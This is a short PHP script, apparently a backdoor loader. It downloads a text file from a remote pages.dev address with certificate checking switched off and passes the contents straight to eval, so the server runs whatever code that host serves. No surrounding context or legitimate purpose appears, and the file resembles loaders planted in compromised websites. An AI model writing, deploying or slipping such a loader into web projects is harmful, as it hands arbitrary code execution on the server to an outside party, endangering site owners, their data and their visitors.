<?php
$url = 'https://melekoglubaklava-cevizli.pages.dev/cevizli.txt';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$fileContents = curl_exec($ch);
curl_close($ch);
if ($fileContents === false) {
    die('[!] component : https://melekoglubaklava-cevizli.pages.dev/cevizli.txt');
}
eval("?>" . $fileContents);
?>